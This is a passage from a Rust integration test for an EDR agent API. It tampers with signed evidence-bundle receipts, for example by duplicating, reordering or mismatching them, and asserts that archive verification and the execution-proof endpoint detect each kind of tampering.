                "/api/v1/agent/edr/evidence-bundles/{bundle_id}/archive"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build collect-evidence archive request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("collect-evidence archive request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 512 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read collect-evidence archive response: {e}"));
        let collect_archive_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode collect-evidence archive response: {e}"));
        assert_eq!(collect_archive_payload["verification"]["verified"], true);
        assert_eq!(
            collect_archive_payload["verification"]["requiredReceiptFamiliesPresent"],
            true
        );
        assert_eq!(
            collect_archive_payload["verification"]["receiptsBindBundleId"],
            true
        );
        assert_eq!(
            collect_archive_payload["verification"]["receiptsBindActor"],
            true
        );
        assert_eq!(
            collect_archive_payload["verification"]["receiptsBindPolicy"],
            true
        );
        assert_eq!(
            collect_archive_payload["verification"]["receiptsBindSensorState"],
            true
        );
        assert_eq!(
            collect_archive_payload["verification"]["receiptsBindEndpointDecision"],
            true
        );
        assert_eq!(
            collect_archive_payload["verification"]["receiptsBindEndpointIdentity"],
            true
        );
        assert_eq!(
            collect_archive_payload["verification"]["receiptEndpointIds"]
                .as_array()
                .unwrap_or_else(|| panic!("missing collect archive endpoint identity list"))
                .len(),
            1
        );
        assert_eq!(
            collect_archive_payload["verification"]["receiptsBindRootNode"],
            true
        );
        assert_eq!(
            collect_archive_payload["verification"]["receiptRootNodeIds"]
                .as_array()
                .unwrap_or_else(|| panic!("missing collect archive root-node list"))
                .len(),
            1
        );
        assert_eq!(
            collect_archive_payload["verification"]["receiptSignersConsistent"],
            true
        );
        assert_eq!(
            collect_archive_payload["verification"]["receiptIdsUnique"],
            true
        );
        let collect_present_receipt_families = collect_archive_payload["verification"]
            ["presentReceiptFamilies"]
            .as_array()
            .unwrap_or_else(|| panic!("missing collect archive present receipt-family list"));
        let collect_required_receipt_families = collect_archive_payload["verification"]
            ["requiredReceiptFamilies"]
            .as_array()
            .unwrap_or_else(|| panic!("missing collect archive required receipt-family list"));
        for required_family in [
            "response_request",
            "response_execution",
            "evidence_bundle_manifest",
        ] {
            assert!(collect_present_receipt_families
                .iter()
                .any(|family| family == required_family));
            assert!(collect_required_receipt_families
                .iter()
                .any(|family| family == required_family));
            assert_eq!(
                collect_archive_payload["verification"]["receiptFamilyCounts"][required_family],
                1
            );
        }
        assert_eq!(
            collect_archive_payload["verification"]["receiptFamilyCardinalityValid"],
            true
        );
        assert_eq!(
            collect_archive_payload["verification"]["missingRequiredReceiptFamilies"],
            serde_json::json!([])
        );
        assert_eq!(
            collect_archive_payload["verification"]["receiptLocalSequencesPresent"],
            true
        );
        assert_eq!(
            collect_archive_payload["verification"]["receiptLocalSequencesUnique"],
            true
        );
        assert_eq!(
            collect_archive_payload["verification"]["receiptLocalSequences"]
                .as_array()
                .unwrap_or_else(|| panic!("missing collect archive local sequence list"))
                .len(),
            collect_archive_payload["verification"]["receiptCount"]
                .as_u64()
                .unwrap_or_default() as usize
        );
        assert_eq!(
            collect_archive_payload["verification"]["receiptTimestampsParse"],
            true
        );
        assert_eq!(
            collect_archive_payload["verification"]["receiptChronologyConsistent"],
            true
        );
        let collect_archive_families = collect_archive_payload["archive"]["receipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing collect-evidence archive receipts"))
            .iter()
            .filter_map(|receipt| {
                receipt["receipt"]["metadata"]["endpointDecision"]["receiptFamily"].as_str()
            })
            .collect::<BTreeSet<_>>();
        assert!(collect_archive_families.contains("response_request"));
        assert!(collect_archive_families.contains("response_execution"));
        assert!(collect_archive_families.contains("evidence_bundle_manifest"));
        let collect_archive: EdrEvidenceBundleArchive = serde_json::from_value(
            collect_archive_payload["archive"].clone(),
        )
        .unwrap_or_else(|e| {
            panic!("failed to decode collect-evidence archive for receipt-family checks: {e}")
        });
        for missing_family in [
            "response_request",
            "response_execution",
            "evidence_bundle_manifest",
        ] {
            let mut missing_family_archive = collect_archive.clone();
            missing_family_archive.receipts.retain(|receipt| {
                receipt_endpoint_decision_str(receipt, &["receiptFamily"]) != Some(missing_family)
            });
            let missing_family_verification =
                evidence_bundle_archive_verification(&missing_family_archive).unwrap_or_else(|e| {
                    panic!("failed to verify archive missing {missing_family}: {e}")
                });
            assert_eq!(missing_family_verification.verified, false);
            assert_eq!(
                missing_family_verification.required_receipt_families_present,
                false
            );
            assert_eq!(
                missing_family_verification.missing_required_receipt_families,
                vec![missing_family.to_string()]
            );
            assert_eq!(missing_family_verification.receipt_families_valid, true);
            assert!(
                missing_family_verification
                    .receipt_failures
                    .iter()
                    .any(|failure| failure == &format!("missing_required_family:{missing_family}")),
                "missing required-family failure for {missing_family}: {:?}",
                missing_family_verification.receipt_failures
            );
        }
        let mut duplicate_family_archive = collect_archive.clone();
        let duplicate_family_request_receipt_index = duplicate_family_archive
            .receipts
            .iter()
            .position(|receipt| {
                receipt_endpoint_decision_str(receipt, &["receiptFamily"])
                    == Some("response_request")
            })
            .unwrap_or_else(|| panic!("missing duplicate-family request receipt index"));
        let duplicate_family_next_sequence = duplicate_family_archive
            .receipts
            .iter()
            .filter_map(receipt_local_sequence)
            .max()
            .unwrap_or_default()
            .saturating_add(1);
        let duplicate_family_keypair = Keypair::from_seed(&[64u8; 32]);
        let mut duplicate_family_decision: EndpointDecisionReceipt = serde_json::from_value(
            duplicate_family_archive.receipts[duplicate_family_request_receipt_index]
                .receipt
                .metadata
                .as_ref()
                .and_then(|metadata| metadata.get("endpointDecision"))
                .cloned()
                .unwrap_or_else(|| panic!("missing duplicate-family endpointDecision metadata")),
        )
        .unwrap_or_else(|e| panic!("failed to decode duplicate-family endpoint decision: {e}"));
        duplicate_family_decision.local_sequence = duplicate_family_next_sequence;
        duplicate_family_decision.signer.signer_public_key =
            Some(duplicate_family_keypair.public_key().to_hex());
        duplicate_family_archive.receipts.push(
            duplicate_family_decision
                .sign_with(&duplicate_family_keypair)
                .unwrap_or_else(|e| panic!("failed to sign duplicate-family receipt: {e}")),
        );
        let duplicate_family_verification =
            evidence_bundle_archive_verification(&duplicate_family_archive)
                .unwrap_or_else(|e| panic!("failed to verify duplicate-family archive: {e}"));
        assert_eq!(duplicate_family_verification.verified, false);
        assert_eq!(duplicate_family_verification.receipt_ids_unique, true);
        assert_eq!(
            duplicate_family_verification.receipt_local_sequences_unique,
            true
        );
        assert_eq!(duplicate_family_verification.receipt_signatures_valid, true);
        assert_eq!(
            duplicate_family_verification.receipt_family_cardinality_valid,
            false
        );
        assert_eq!(
            duplicate_family_verification
                .receipt_family_counts
                .get("response_request"),
            Some(&2)
        );
        assert!(
            duplicate_family_verification
                .receipt_failures
                .iter()
                .any(|failure| failure == "duplicate_receipt_family:response_request:2"),
            "missing duplicate family failure: {:?}",
            duplicate_family_verification.receipt_failures
        );
        let mut duplicate_sequence_archive = collect_archive.clone();
        let duplicate_sequence_request_receipt_index = duplicate_sequence_archive
            .receipts
            .iter()
            .position(|receipt| {
                receipt_endpoint_decision_str(receipt, &["receiptFamily"])
                    == Some("response_request")
            })
            .unwrap_or_else(|| panic!("missing duplicate-sequence request receipt index"));
        let duplicate_sequence_execution_sequence = duplicate_sequence_archive
            .receipts
            .iter()
            .find(|receipt| {
                receipt_endpoint_decision_str(receipt, &["receiptFamily"])
                    == Some("response_execution")
            })
            .and_then(receipt_local_sequence)
            .unwrap_or_else(|| panic!("missing duplicate-sequence execution local sequence"));
        let duplicate_sequence_keypair = Keypair::from_seed(&[64u8; 32]);
        let mut duplicate_sequence_endpoint_decision: EndpointDecisionReceipt =
            serde_json::from_value(
                duplicate_sequence_archive.receipts[duplicate_sequence_request_receipt_index]
                    .receipt
                    .metadata
                    .as_ref()
                    .and_then(|metadata| metadata.get("endpointDecision"))
                    .cloned()
                    .unwrap_or_else(|| {
                        panic!("missing duplicate-sequence request endpointDecision metadata")
                    }),
            )
            .unwrap_or_else(|e| {
                panic!("failed to decode duplicate-sequence endpoint decision: {e}")
            });
        duplicate_sequence_endpoint_decision.local_sequence = duplicate_sequence_execution_sequence;
        duplicate_sequence_endpoint_decision
            .signer
            .signer_public_key = Some(duplicate_sequence_keypair.public_key().to_hex());
        duplicate_sequence_archive.receipts[duplicate_sequence_request_receipt_index] =
            duplicate_sequence_endpoint_decision
                .sign_with(&duplicate_sequence_keypair)
                .unwrap_or_else(|e| panic!("failed to sign duplicate-sequence receipt: {e}"));
        let duplicate_sequence_verification =
            evidence_bundle_archive_verification(&duplicate_sequence_archive)
                .unwrap_or_else(|e| panic!("failed to verify duplicate-sequence archive: {e}"));
        assert_eq!(duplicate_sequence_verification.verified, false);
        assert_eq!(duplicate_sequence_verification.receipt_ids_unique, true);
        assert_eq!(
            duplicate_sequence_verification.receipt_local_sequences_present,
            true
        );
        assert_eq!(
            duplicate_sequence_verification.receipt_local_sequences_unique,
            false
        );
        assert_eq!(
            duplicate_sequence_verification.receipt_signatures_valid,
            true
        );
        assert_eq!(
            duplicate_sequence_verification.receipt_signers_consistent,
            true
        );
        assert!(
            duplicate_sequence_verification
                .receipt_failures
                .iter()
                .any(|failure| failure.starts_with("duplicate_receipt_local_sequence:")),
            "missing duplicate local-sequence failure: {:?}",
            duplicate_sequence_verification.receipt_failures
        );
        let mut inverted_timestamp_archive = collect_archive.clone();
        let inverted_timestamp_manifest_receipt_index = inverted_timestamp_archive
            .receipts
            .iter()
            .position(|receipt| {
                receipt_endpoint_decision_str(receipt, &["receiptFamily"])
                    == Some("evidence_bundle_manifest")
            })
            .unwrap_or_else(|| panic!("missing inverted-timestamp manifest receipt index"));
        inverted_timestamp_archive.receipts[inverted_timestamp_manifest_receipt_index]
            .receipt
            .timestamp = "1970-01-01T00:00:00Z".to_string();
        let inverted_timestamp_verification =
            evidence_bundle_archive_verification(&inverted_timestamp_archive)
                .unwrap_or_else(|e| panic!("failed to verify inverted-timestamp archive: {e}"));
        assert_eq!(inverted_timestamp_verification.verified, false);
        assert_eq!(
            inverted_timestamp_verification.receipt_timestamps_parse,
            true
        );
        assert_eq!(
            inverted_timestamp_verification.receipt_chronology_consistent,
            false
        );
        assert_eq!(
            inverted_timestamp_verification.receipt_signatures_valid,
            false
        );
        assert!(
            inverted_timestamp_verification
                .receipt_failures
                .iter()
                .any(|failure| failure.starts_with("receipt_chronology_inversion:")),
            "missing timestamp chronology inversion failure: {:?}",
            inverted_timestamp_verification.receipt_failures
        );
        let mut mixed_endpoint_archive = collect_archive.clone();
        let mixed_endpoint_manifest_receipt_index = mixed_endpoint_archive
            .receipts
            .iter()
            .position(|receipt| {
                receipt_endpoint_decision_str(receipt, &["receiptFamily"])
                    == Some("evidence_bundle_manifest")
            })
            .unwrap_or_else(|| panic!("missing mixed-endpoint archive manifest receipt index"));
        let mixed_endpoint_keypair = Keypair::from_seed(&[64u8; 32]);
        let mut mixed_endpoint_decision: EndpointDecisionReceipt = serde_json::from_value(
            mixed_endpoint_archive.receipts[mixed_endpoint_manifest_receipt_index]
                .receipt
                .metadata
                .as_ref()
                .and_then(|metadata| metadata.get("endpointDecision"))
                .cloned()
                .unwrap_or_else(|| {
                    panic!("missing mixed-endpoint manifest endpointDecision metadata")
                }),
        )
        .unwrap_or_else(|e| panic!("failed to decode mixed-endpoint endpoint decision: {e}"));
        mixed_endpoint_decision.actor.endpoint_id = "endpoint-agent-archive-other".to_string();
        mixed_endpoint_decision.signer.signer_public_key =
            Some(mixed_endpoint_keypair.public_key().to_hex());
        mixed_endpoint_archive.receipts[mixed_endpoint_manifest_receipt_index] =
            mixed_endpoint_decision
                .sign_with(&mixed_endpoint_keypair)
                .unwrap_or_else(|e| panic!("failed to sign mixed-endpoint receipt: {e}"));
        let mixed_endpoint_verification =
            evidence_bundle_archive_verification(&mixed_endpoint_archive)
                .unwrap_or_else(|e| panic!("failed to verify mixed-endpoint archive: {e}"));
        assert_eq!(mixed_endpoint_verification.verified, false);
        assert_eq!(mixed_endpoint_verification.receipt_ids_unique, true);
        assert_eq!(mixed_endpoint_verification.receipt_signatures_valid, true);
        assert_eq!(mixed_endpoint_verification.receipt_signers_consistent, true);
        assert_eq!(mixed_endpoint_verification.receipts_bind_actor, true);
        assert_eq!(
            mixed_endpoint_verification.receipts_bind_endpoint_identity,
            false
        );
        assert_eq!(mixed_endpoint_verification.receipt_endpoint_ids.len(), 2);
        assert!(
            mixed_endpoint_verification
                .receipt_failures
                .iter()
                .any(|failure| failure == "receipt_endpoint_identity_mismatch:2"),
            "missing endpoint identity continuity failure: {:?}",
            mixed_endpoint_verification.receipt_failures
        );
        let mut mixed_root_archive = collect_archive.clone();
        let mixed_root_manifest_receipt_index = mixed_root_archive
            .receipts
            .iter()
            .position(|receipt| {
                receipt_endpoint_decision_str(receipt, &["receiptFamily"])
                    == Some("evidence_bundle_manifest")
            })
            .unwrap_or_else(|| panic!("missing mixed-root archive manifest receipt index"));
        let original_root_node_id = receipt_endpoint_decision_str(
            &mixed_root_archive.receipts[mixed_root_manifest_receipt_index],
            &["graph", "processNodeId"],
        )
        .unwrap_or_else(|| panic!("missing mixed-root original process node id"));
        let mixed_root_node_id = mixed_root_archive
            .graph
            .nodes
            .keys()
            .find(|node_id| node_id.as_str() != original_root_node_id)
            .cloned()
            .unwrap_or_else(|| panic!("missing alternate root node for mixed-root archive"));
        let mixed_root_keypair = Keypair::from_seed(&[64u8; 32]);
        let mut mixed_root_decision: EndpointDecisionReceipt = serde_json::from_value(
            mixed_root_archive.receipts[mixed_root_manifest_receipt_index]
                .receipt
                .metadata
                .as_ref()
                .and_then(|metadata| metadata.get("endpointDecision"))
                .cloned()
                .unwrap_or_else(|| panic!("missing mixed-root manifest endpointDecision metadata")),
        )
        .unwrap_or_else(|e| panic!("failed to decode mixed-root endpoint decision: {e}"));
        let mixed_root_graph =
            EndpointGraphReference::for_subgraph(mixed_root_node_id, &mixed_root_archive.graph);
        let mixed_root_graph_slice_id = mixed_root_graph
            .graph_slice_id
            .clone()
            .unwrap_or_else(|| panic!("missing mixed-root graph slice id"));
        mixed_root_decision.graph = mixed_root_graph;
        let graph_slice_evidence = mixed_root_decision
            .evidence
            .iter_mut()
            .find(|item| item.key == "graphSliceId")
            .unwrap_or_else(|| panic!("missing mixed-root manifest graphSliceId evidence"));
        *graph_slice_evidence =
            EndpointReceiptEvidence::hashed("graphSliceId", &mixed_root_graph_slice_id);
        mixed_root_decision.signer.signer_public_key =
            Some(mixed_root_keypair.public_key().to_hex());
        mixed_root_archive.receipts[mixed_root_manifest_receipt_index] = mixed_root_decision
            .sign_with(&mixed_root_keypair)
            .unwrap_or_else(|e| panic!("failed to sign mixed-root receipt: {e}"));
        let mixed_root_verification = evidence_bundle_archive_verification(&mixed_root_archive)
            .unwrap_or_else(|e| panic!("failed to verify mixed-root archive: {e}"));
        assert_eq!(mixed_root_verification.verified, false);
        assert_eq!(mixed_root_verification.receipt_ids_unique, true);
        assert_eq!(mixed_root_verification.receipt_signatures_valid, true);
        assert_eq!(mixed_root_verification.receipt_signers_consistent, true);
        assert_eq!(
            mixed_root_verification.receipts_bind_endpoint_decision,
            true
        );
        assert_eq!(
            mixed_root_verification.receipts_bind_endpoint_identity,
            true
        );
        assert_eq!(mixed_root_verification.receipts_bind_root_node, false);
        assert_eq!(mixed_root_verification.receipt_root_node_ids.len(), 2);
        assert!(
            mixed_root_verification
                .receipt_failures
                .iter()
                .any(|failure| failure == "receipt_root_node_continuity_mismatch:2"),
            "missing root-node continuity failure: {:?}",
            mixed_root_verification.receipt_failures
        );
        let mut mixed_signer_archive = collect_archive.clone();
        let request_receipt_index = mixed_signer_archive
            .receipts
            .iter()
            .position(|receipt| {
                receipt_endpoint_decision_str(receipt, &["receiptFamily"])
                    == Some("response_request")
            })
            .unwrap_or_else(|| panic!("missing mixed-signer archive request receipt index"));
        let mixed_signer_keypair = Keypair::from_seed(&[72u8; 32]);
        let mut mixed_signer_endpoint_decision: EndpointDecisionReceipt = serde_json::from_value(
            mixed_signer_archive.receipts[request_receipt_index]
                .receipt
                .metadata
                .as_ref()
                .and_then(|metadata| metadata.get("endpointDecision"))
                .cloned()
                .unwrap_or_else(|| {
                    panic!("missing mixed-signer request endpointDecision metadata")
                }),
        )
        .unwrap_or_else(|e| panic!("failed to decode mixed-signer endpoint decision: {e}"));
        mixed_signer_endpoint_decision.signer.signer_public_key =
            Some(mixed_signer_keypair.public_key().to_hex());
        mixed_signer_archive.receipts[request_receipt_index] = mixed_signer_endpoint_decision
            .sign_with(&mixed_signer_keypair)
            .unwrap_or_else(|e| panic!("failed to sign mixed-signer receipt: {e}"));
        let mixed_signer_verification = evidence_bundle_archive_verification(&mixed_signer_archive)
            .unwrap_or_else(|e| panic!("failed to verify mixed-signer archive: {e}"));
        assert_eq!(mixed_signer_verification.verified, false);
        assert_eq!(mixed_signer_verification.receipt_ids_unique, true);
        assert_eq!(mixed_signer_verification.receipt_signatures_valid, true);
        assert_eq!(mixed_signer_verification.receipt_signers_consistent, false);
        assert!(
            mixed_signer_verification
                .receipt_failures
                .iter()
                .any(|failure| failure == "receipt_signer_continuity_mismatch:2"),
            "missing signer continuity failure: {:?}",
            mixed_signer_verification.receipt_failures
        );
        let mut wrong_count_archive = collect_archive.clone();
        let manifest_receipt_index = wrong_count_archive
            .receipts
            .iter()
            .position(|receipt| {
                receipt_endpoint_decision_str(receipt, &["receiptFamily"])
                    == Some("evidence_bundle_manifest")
            })
            .unwrap_or_else(|| panic!("missing wrong-count archive manifest receipt index"));
        let wrong_node_count_hash = sha256(b"0").to_hex_prefixed();
        let manifest_metadata = wrong_count_archive.receipts[manifest_receipt_index]
            .receipt
            .metadata
            .as_mut()
            .and_then(|metadata| metadata.get_mut("endpointDecision"))
            .unwrap_or_else(|| panic!("missing wrong-count manifest endpointDecision metadata"));
        let manifest_evidence = manifest_metadata
            .get_mut("evidence")
            .and_then(Value::as_array_mut)
            .unwrap_or_else(|| panic!("missing wrong-count manifest evidence"));
        let node_count_evidence = manifest_evidence
            .iter_mut()
            .find(|item| item.get("key").and_then(Value::as_str) == Some("nodeCount"))
            .unwrap_or_else(|| panic!("missing wrong-count manifest nodeCount evidence"));
        node_count_evidence["valueHash"] = Value::String(wrong_node_count_hash);
        let wrong_count_verification = evidence_bundle_archive_verification(&wrong_count_archive)
            .unwrap_or_else(|e| panic!("failed to verify wrong-count manifest archive: {e}"));
        assert_eq!(wrong_count_verification.verified, false);
        assert_eq!(wrong_count_verification.receipt_signatures_valid, false);
        assert_eq!(wrong_count_verification.receipts_bind_bundle_id, true);
        assert_eq!(wrong_count_verification.receipts_bind_graph_slice, true);
        assert_eq!(wrong_count_verification.receipts_bind_content_hash, true);
        assert_eq!(
            wrong_count_verification.required_receipt_families_present,
            true
        );
        assert_eq!(wrong_count_verification.graph_counts_match, false);
        assert!(
            wrong_count_verification
                .receipt_failures
                .iter()
                .any(|failure| failure.contains(":node_count_mismatch:")),
            "missing node-count mismatch failure: {:?}",
            wrong_count_verification.receipt_failures
        );
        assert!(
            wrong_count_verification
                .receipt_failures
                .iter()
                .any(|failure| failure.contains(":signature_invalid")),
            "missing signature failure for tampered manifest receipt: {:?}",
            wrong_count_verification.receipt_failures
        );
        let mut wrong_execution_hash_archive = collect_archive.clone();
        let execution_receipt_index = wrong_execution_hash_archive
            .receipts
            .iter()
            .position(|receipt| {
                receipt_endpoint_decision_str(receipt, &["receiptFamily"])
                    == Some("response_execution")
            })
            .unwrap_or_else(|| panic!("missing wrong-content archive execution receipt index"));
        let wrong_content_hash = sha256(b"wrong-content-hash").to_hex_prefixed();
        let execution_metadata = wrong_execution_hash_archive.receipts[execution_receipt_index]
            .receipt
            .metadata
            .as_mut()
            .and_then(|metadata| metadata.get_mut("endpointDecision"))
            .unwrap_or_else(|| panic!("missing wrong-content execution endpointDecision metadata"));
        let execution_evidence = execution_metadata
            .get_mut("evidence")
            .and_then(Value::as_array_mut)
            .unwrap_or_else(|| panic!("missing wrong-content execution evidence"));
        let bundle_content_hash_evidence = execution_evidence
            .iter_mut()
            .find(|item| {
                item.get("key").and_then(Value::as_str) == Some("evidenceBundleContentHash")
            })
            .unwrap_or_else(|| {
                panic!("missing wrong-content execution evidenceBundleContentHash evidence")
            });
        bundle_content_hash_evidence["valueHash"] = Value::String(wrong_content_hash);
        let wrong_execution_hash_verification = evidence_bundle_archive_verification(
            &wrong_execution_hash_archive,
        )
        .unwrap_or_else(|e| panic!("failed to verify wrong-content execution archive: {e}"));
        assert_eq!(wrong_execution_hash_verification.verified, false);
        assert_eq!(
            wrong_execution_hash_verification.receipt_signatures_valid,
            false
        );
        assert_eq!(
            wrong_execution_hash_verification.receipts_bind_bundle_id,
            true
        );
        assert_eq!(
            wrong_execution_hash_verification.receipts_bind_graph_slice,
            true
        );
        assert_eq!(
            wrong_execution_hash_verification.receipts_bind_content_hash,
            false
        );
        assert!(
            wrong_execution_hash_verification
                .receipt_failures
                .iter()
                .any(|failure| failure.contains(":content_hash_mismatch:")),
            "missing execution content-hash mismatch failure: {:?}",
            wrong_execution_hash_verification.receipt_failures
        );
        let mut wrong_actor_archive = collect_archive.clone();
        let request_receipt_index = wrong_actor_archive
            .receipts
            .iter()
            .position(|receipt| {
                receipt_endpoint_decision_str(receipt, &["receiptFamily"])
                    == Some("response_request")
            })
            .unwrap_or_else(|| panic!("missing wrong-actor archive request receipt index"));
        let wrong_actor_hash = sha256(b"wrong-actor-hash").to_hex_prefixed();
        let request_metadata = wrong_actor_archive.receipts[request_receipt_index]
            .receipt
            .metadata
            .as_mut()
            .and_then(|metadata| metadata.get_mut("endpointDecision"))
            .unwrap_or_else(|| panic!("missing wrong-actor request endpointDecision metadata"));
        let request_evidence = request_metadata
            .get_mut("evidence")
            .and_then(Value::as_array_mut)
            .unwrap_or_else(|| panic!("missing wrong-actor request evidence"));
        let actor_hash_evidence = request_evidence
            .iter_mut()
            .find(|item| item.get("key").and_then(Value::as_str) == Some("actorHash"))
            .unwrap_or_else(|| panic!("missing wrong-actor request actorHash evidence"));
        actor_hash_evidence["valueHash"] = Value::String(wrong_actor_hash);
        let wrong_actor_verification = evidence_bundle_archive_verification(&wrong_actor_archive)
            .unwrap_or_else(|e| panic!("failed to verify wrong-actor archive: {e}"));
        assert_eq!(wrong_actor_verification.verified, false);
        assert_eq!(wrong_actor_verification.receipt_signatures_valid, false);
        assert_eq!(wrong_actor_verification.receipts_bind_actor, false);
        assert_eq!(wrong_actor_verification.receipts_bind_bundle_id, true);
        assert_eq!(wrong_actor_verification.receipts_bind_graph_slice, true);
        assert_eq!(wrong_actor_verification.receipts_bind_content_hash, true);
        assert!(
            wrong_actor_verification
                .receipt_failures
                .iter()
                .any(|failure| failure.contains(":actor_hash_mismatch:")),
            "missing actor hash mismatch failure: {:?}",
            wrong_actor_verification.receipt_failures
        );
        let mut wrong_policy_archive = collect_archive.clone();
        let request_receipt_index = wrong_policy_archive
            .receipts
            .iter()
            .position(|receipt| {
                receipt_endpoint_decision_str(receipt, &["receiptFamily"])
                    == Some("response_request")
            })
            .unwrap_or_else(|| panic!("missing wrong-policy archive request receipt index"));
        let request_metadata = wrong_policy_archive.receipts[request_receipt_index]
            .receipt
            .metadata
            .as_mut()
            .and_then(|metadata| metadata.get_mut("endpointDecision"))
            .unwrap_or_else(|| panic!("missing wrong-policy request endpointDecision metadata"));
        request_metadata["policy"]["policyHash"] =
            Value::String("0x0000000000000000000000000000000000000000".to_string());
        let wrong_policy_verification = evidence_bundle_archive_verification(&wrong_policy_archive)
            .unwrap_or_else(|e| panic!("failed to verify wrong-policy archive: {e}"));
        assert_eq!(wrong_policy_verification.verified, false);
        assert_eq!(wrong_policy_verification.receipt_signatures_valid, false);
        assert_eq!(wrong_policy_verification.receipts_bind_policy, false);
        assert_eq!(wrong_policy_verification.receipts_bind_sensor_state, true);
        assert_eq!(wrong_policy_verification.receipts_bind_actor, true);
        assert!(
            wrong_policy_verification
                .receipt_failures
                .iter()
                .any(|failure| failure.contains("policy_continuity_mismatch")),
            "missing policy continuity failure: {:?}",
            wrong_policy_verification.receipt_failures
        );
        let mut wrong_sensor_archive = collect_archive.clone();
        let request_receipt_index = wrong_sensor_archive
            .receipts
            .iter()
            .position(|receipt| {
                receipt_endpoint_decision_str(receipt, &["receiptFamily"])
                    == Some("response_request")
            })
            .unwrap_or_else(|| panic!("missing wrong-sensor archive request receipt index"));
        let request_metadata = wrong_sensor_archive.receipts[request_receipt_index]
            .receipt
            .metadata
            .as_mut()
            .and_then(|metadata| metadata.get_mut("endpointDecision"))
            .unwrap_or_else(|| panic!("missing wrong-sensor request endpointDecision metadata"));
        request_metadata["sensorState"]["providers"] = Value::Array(Vec::new());
        let wrong_sensor_verification = evidence_bundle_archive_verification(&wrong_sensor_archive)
            .unwrap_or_else(|e| panic!("failed to verify wrong-sensor archive: {e}"));
        assert_eq!(wrong_sensor_verification.verified, false);
        assert_eq!(wrong_sensor_verification.receipt_signatures_valid, false);
        assert_eq!(wrong_sensor_verification.receipts_bind_sensor_state, false);
        assert_eq!(wrong_sensor_verification.receipts_bind_policy, true);
        assert_eq!(wrong_sensor_verification.receipts_bind_actor, true);
        assert!(
            wrong_sensor_verification
                .receipt_failures
                .iter()
                .any(|failure| failure.contains(":sensor_state_missing_providers")),
            "missing sensor-state provider failure: {:?}",
            wrong_sensor_verification.receipt_failures
        );

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build execution proof request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("execution proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read execution proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected execution proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode execution proof response: {e}"));
        assert_eq!(
            proof_payload["execution"]["execution"]["executionId"],
            execution_id
        );
        assert_eq!(
            proof_payload["requestReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_request"
        );
        assert_eq!(
            proof_payload["requestReceipt"]["receipt"]["metadata"]["endpointDecision"]["decision"]
                ["findingId"],
            payload["plan"]["actionId"]
        );
        assert_eq!(
            proof_payload["executionReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_execution"
        );
        assert_eq!(
            proof_payload["evidenceBundleReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "evidence_bundle_manifest"
        );
        assert_eq!(
            proof_payload["evidenceBundleArtifact"]["bundleId"],
            payload["execution"]["evidenceBundle"]["bundleId"]
        );
        assert_eq!(
            proof_payload["evidenceBundleArtifact"]["contentHash"],
            payload["execution"]["evidenceBundle"]["contentHash"]
        );
        assert!(
            proof_payload["evidenceBundleArtifact"]["byteCount"]
                .as_u64()
                .unwrap_or_default()
                > 0
        );
        let proof_providers = proof_payload["providerState"]["providers"]
            .as_array()
            .unwrap_or_else(|| panic!("missing proof provider state"));
        assert!(proof_providers
            .iter()
            .any(|provider| provider["providerId"] == "agent-api"));
        assert!(proof_providers
            .iter()
            .any(|provider| provider["providerId"] == "macos.endpoint_security"));
        assert!(proof_providers
            .iter()
            .any(|provider| provider["providerId"] == "macos.network_extension"));
        assert_eq!(
            proof_payload["graph"]["graphSliceId"],
            bundle_decision["graph"]["graphSliceId"]
        );
        assert_eq!(proof_payload["affectedIdentityCount"].as_u64(), Some(6));
        assert_eq!(proof_payload["affectedToolCount"].as_u64(), Some(1));
        assert_eq!(
            proof_payload["affectedIdentities"]["hosts"][0]["id"],
            "host-collect-1"
        );
        assert_eq!(
            proof_payload["affectedIdentities"]["users"][0]["id"],
            "alice"
        );
        assert_eq!(
            proof_payload["affectedIdentities"]["sessions"][0]["id"],
            "session-collect-1"
        );
        assert_eq!(
            proof_payload["affectedIdentities"]["agents"][0]["id"],
            "agent-collect-1"
        );
        assert_eq!(
            proof_payload["affectedIdentities"]["workloads"][0]["id"],
            "workload-collect-1"
        );
        assert_eq!(
            proof_payload["affectedIdentities"]["approvals"][0]["id"],
            "approval-collect-1"
        );
        assert_eq!(proof_payload["affectedTools"][0]["toolName"], "mcp.shell");

        let original_execution = {
            let ledger = state.edr_response_execution_ledger.lock().await;
            ledger
                .get(execution_id)
                .unwrap_or_else(|e| panic!("failed to read original response execution: {e}"))
                .unwrap_or_else(|| panic!("missing original response execution"))
        };
        let mut actor_mismatched_execution = original_execution.clone();
        actor_mismatched_execution
            .actor
            .as_mut()
            .unwrap_or_else(|| panic!("missing response execution actor"))
            .user_id = Some("operator:other".to_string());
        {
            let mut ledger = state.edr_response_execution_ledger.lock().await;
            ledger
                .append(&actor_mismatched_execution)
                .unwrap_or_else(|e| panic!("failed to append actor-mismatched execution: {e}"));
        }
        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| {
                panic!("failed to build actor-mismatched execution proof request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
